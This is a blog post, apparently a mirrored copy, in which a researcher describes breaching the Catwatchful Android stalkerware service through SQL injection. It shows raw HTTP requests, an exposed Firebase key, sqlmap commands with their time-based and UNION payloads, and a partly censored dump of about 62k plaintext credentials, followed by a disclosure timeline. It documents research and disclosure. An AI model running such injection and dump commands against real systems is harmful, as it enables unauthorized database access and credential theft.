<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://ericdaigle.ca/posts/taking-over-60k-spyware-user-accounts/">Original</a>
    <h1>Taking over 60k spyware user accounts with SQL injection</h1>
    
    <div id="readability-page-1" class="page"><div><div>
        
<p>Recently I was looking through a database of known stalkerware services and found one I wasn’t familiar with: <a href="https://archive.is/Fttgd">Catwatchful</a>. It seemed to be a full-featured Android spy app, to actually be its own service as opposed to a millionth FlexiSpy reseller, and to offer a 3-day free trial. Aside from a boilerplate disclaimer to only use it with consent, it also pretty brazenly advertised itself as stalkerware in the FAQ:</p>
<blockquote>
<p>Q: Can I monitor a phone without them knowing?</p>
<p>A: Yes, you can monitor a phone without them knowing with mobile phone monitoring software. The app is invisible and undetectable on the phone. It works in a hidden and stealth mode.</p>
</blockquote>
<p>Apparently still unsatisfied, it boasted even further about “absolute stealth” in a list of features:</p>
<blockquote>
<p>Catwatchful is invisible. It cannot be detected. It cannot be uninstalled. It cannot be stopped. It cannot be closed. Only you can access the information it collects.</p>
</blockquote>
<p>Let’s see about that last part, shall we?</p>

<p>I began by making a free trial account on the website. Interestingly, this triggered two separate POST requests:</p>
<pre tabindex="0"><code>METHOD: POST
URL: https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyBVQYU9-rygrs-NQhOdhtY1iC02JOq_l0U
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
X-Client-Version: Firefox/JsCore/10.12.2/FirebaseCore-web
X-Firebase-gmpid: 1:290254967732:android:1be5a596e0649f3e
Content-Type: application/json
Origin: https://cp.catwatchful.com
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=6
TE: trailers

{&#34;returnSecureToken&#34;:true,&#34;email&#34;:&#34;test123@edaigle.ca&#34;,&#34;password&#34;:&#34;test123&#34;,&#34;clientType&#34;:&#34;CLIENT_TYPE_WEB&#34;}

STATUS: 200 OK

&lt;uninteresting successful firebase account creation response&gt;
</code></pre><p>and</p>
<pre tabindex="0"><code>METHOD: POST
URL: https://catwatchful.pink/webservice/servicios.php?operation=newUser&amp;email=test123@edaigle.ca&amp;pass=test123&amp;firebase_uid=JIOgo826TPfb0pMFKmzkE7jz9JO2&#39;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://cp.catwatchful.com/
Origin: https://cp.catwatchful.com
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=4
Content-Length: 0

STATUS: 200 OK
Content-Type: application/json
Date: Mon, 9 Jun 2025 16:50:31 GMT
Server: Apache

{&#34;statusCode&#34;:200,&#34;statusMessage&#34;:&#34;newUser: OK&#34;,&#34;data&#34;:&#34;6904999&#34;}
</code></pre><p>It seems to have made me an account in both a Firebase instance and a custom database on <code>catwatchful.pink</code>.</p>
<p>After registration and login, I get given an APK to download and install. From here, installation goes as usual for Android stalkerware: the app has me download and install another APK pre-configured with my account credentials. This app then asks for basically every permission on the system, guides me through uninstalling the original installer app, then runs in the background forever while disguising itself in the app drawer with a generic “Settings” icon.</p>

<p>After installing the app and re-logging into the web interface, I’m presented with a control panel with which to spy on my test phone. Two things stand out to me here: first of all, the app works really well. A lot of stalkerware apps are half-broken, clearly built by gluing together various chunks of spaghetti code long abandoned by their original authors. Not so here - all these features work as advertised with minimal latency. The live photo and microphone options are particularly creepy, successfully taking a photo or recording and uploading it for me to view near-instantly on the control panel without giving the phone user the slightest sign that anything is amiss.</p>
<figure><img src="https://ericdaigle.ca/posts/taking-over-60k-spyware-user-accounts/cw-censored.png" alt="Screenshot of Catwatchful control panel"/><figcaption>
      <p>The only bug I found was in the sidebar counters (I did not in fact take 3002 screenshots while testing)</p>
    </figcaption>
</figure>

<p>The second notable thing is that all the personal data collected here seems to be stored in Firebase, served from Cloud Storage URLs in the form <code>catwatchful-e03b8.appspot.com/o/usersFiles/JIOgo826TPfb0pMFKmzkE7jz9JO2/M6GPYXHZ95ULUFD0/micRecorders/grab_2025-06-09_17-04-34</code>. Intercepting my test phone’s traffic confirms that the files are directly uploaded to Firebase, and reveals that the commands for features like live photos are also handled through FCM. This is going to reduce our attack surface by a lot - nothing in Firebase is going to be IDORable or vulnerable to SQLI, and some quick testing eliminates any of the usual traps like open storage buckets or client-side service account credentials. We’re going to have to focus on that mysterious <code>catwatchful.pink</code> server I was also signed up on.</p>

<p>Scrolling back through the requests since I logged back in, I see a few more requests were made to <code>catwatchful.pink</code>, seemingly to a PHP API which provides various account information used to construct the control panel UI. Let’s focus on the first one:</p>
<pre tabindex="0"><code>METHOD: GET
URL: https://catwatchful.pink/webservice/servicios.php?operation=getDevice&amp;imei=M6GPYXHZ95ULUFD0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://cp.catwatchful.com/
Origin: https://cp.catwatchful.com
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=4
Content-Length: 0

STATUS: 200 OK
Content-Type: application/json
Date: Mon, 9 Jun 2025 18:01:31 GMT
Server: Apache

{&#34;statusCode&#34;:200,&#34;statusMessage&#34;:&#34;getDevice: OK&#34;,&#34;data&#34;:[{&#34;imei&#34;:&#34;M6GPYXHZ95ULUFD0&#34;,&#34;fecInst&#34;:&#34;2025-06-09 16:55:11&#34;,&#34;ts_lastSync&#34;:&#34;1749493803&#34;,&#34;country&#34;:null,&#34;appVersion&#34;:&#34;18 - Beta 1&#34;,&#34;selfUninstall&#34;:null,&#34;ts_now&#34;:&#34;1749494763&#34;},null]}
</code></pre><p>Like all the other <code>servicios.php</code> calls, this is unauthenticated - I can get anyone’s installation date, last seen date, and installation status just by knowing their <code>imei</code> parameter! But none of this data is that interesting, and even if it were, the <code>imei</code> parameter (which despite its name seems to just be a random 16-digit alphanumeric device identifier) has too much entropy to be vulnerable to an IDOR. Testing the other <code>operation</code> endpoints hoping to find credentials or pre-signed Firebase Storage URLs yields similar results.</p>

<p>Having given up on finding anything sensitive through an unauthenticated API call, I figured I may as well try SQLI, even knowing how long of a shot finding it on a production service in 2025 is. Let’s give it a shot on that same <code>getDevice</code> endpoint:</p>
<pre tabindex="0"><code>edaigle@garibaldi ~/h/catwatchful&gt; sqlmap https://catwatchful.pink/webservice/servicios.php?operation=getDevice&amp;imei=M6GPYXHZ95ULUFD0
...
sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: https://catwatchful.pink/webservice/servicios.php?operation=getDevice&amp;imei=&#39; AND (SELECT 4047 FROM (SELECT(SLEEP(5)))gYOW) AND &#39;qIwU&#39;=&#39;qIwU

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: https://catwatchful.pink/webservice/servicios.php?operation=getDevice&amp;imei=&#39; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71786a7671,0x547270536e71634364706658434b51654c666a504156797743416a4d565247584a69774d645a5546,0x7170717171),NULL,NULL,NULL-- -
---
</code></pre><p>Well that was easy. And there’s even a non-blind one we can use to dump the database in a reasonable amount of time.</p>

<p>Time to see what we can get out of this thing:</p>
<pre tabindex="0"><code>edaigle@garibaldi ~/h/catwatchful&gt; sqlmap https://catwatchful.pink/webservice/servicios.php?operation=getDevice&amp;imei=M6GPYXHZ95ULUFD0 --dump-all
...
Database: catwatch_system
Table: user
[62050 entries]
+---------+------------------------------+--------------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+----------------+
| userId  | firebase_uid                 | pass                                                               | email                                                                                                                 | fecCreacion         | fecUltimoAc         | lastClientUsed |
+---------+------------------------------+--------------------------------------------------------------------+-----------------------------------------------------------------------------------------------------------------------+---------------------+---------------------+----------------+
| 1       | OFcPdPwjZkcAZeL8hbFs438oXVl1 | demo123                                                            | demo@demo.com                                                                                                         | 2022-10-18 14:28:18 | 2025-06-06 22:32:05 | 1              |
| 1886    | UCm3vZjy66PittxG9EAE5OGStNh2 | Jxxxxxxxxxxxx                                                      | mxxxxxxxxxxxxxxxxxx@gmail.com                                                                                         | 2018-03-22 00:09:20 | 2025-05-30 06:27:53 | 1              |
| 2897    | shaaozpRiuap9I2KUd5XFT2DYNv2 | axxxxxxxxxxxx                                                      | jxxxxxxxxx@hotmail.com                                                                                                | 2018-04-13 19:46:55 | 2025-05-20 21:14:39 | 1              |
...
</code></pre><p>The censors are mine - this table contains plaintext logins and passwords for all ~62k Catwatchful accounts. The dump also yielded a few other tables linking accounts to devices and some tracking administrative stats, but the rest are essentialy all redundant given this one. We now control every account on the service.</p>

<p>Dumping a stalkerware service’s database lets you do lots of fun things like identify who runs it and report it to various cloud providers who claim they’ll take it down. Most of this work was generously taken on by noted actual journalist Zack Whittaker, who as usual put together <a href="https://techcrunch.com/2025/07/02/data-breach-reveals-catwatchful-stalkerware-spying-on-thousands-android-phones/">a great piece</a> for TechCrunch.</p>

<ul>
<li><strong>2025-06-09</strong>: Vulnerability discovered, Zack contacted</li>
<li><strong>2025-06-23</strong>: Zack contacts Google who flag it in Safe Browsing, Firebase team claim they’re looking into it (DB still up as of this writing)</li>
<li><strong>2025-06-25</strong>: Zack contacts Hosting.com who host <code>catwatchful.pink</code> (site is down by end of day, breaking the service) and individual identified as running the service (no response as of this writing)</li>
<li><strong>2025-06-26</strong>: Service is restored with <code>catwatchful.pink</code> replaced by <code>xng.vju.temporary.site</code> which is still vulnerable</li>
<li><strong>2025-06-27</strong>: A WAF goes up on <code>xng.vju.temporary.site</code>, successfully blocking the SQLI</li>
<li><strong>2025-07-02</strong>: Publication</li>
</ul>

<p>If you’ve made it this far, consider supporting my work with a small donation on <a id="kofi-button" data-umami-event="Kofi button" href="https://ko-fi.com/edaigle">ko-fi</a>! This site is ad-free and social-media-free and uses open-source privacy-respecting <a href="https://umami.ericdaigle.ca/share/SVAW2sBMoX4TA6BM/ericdaigle.ca">analytics</a>.</p>

      </div></div></div>
  </body>
</html>
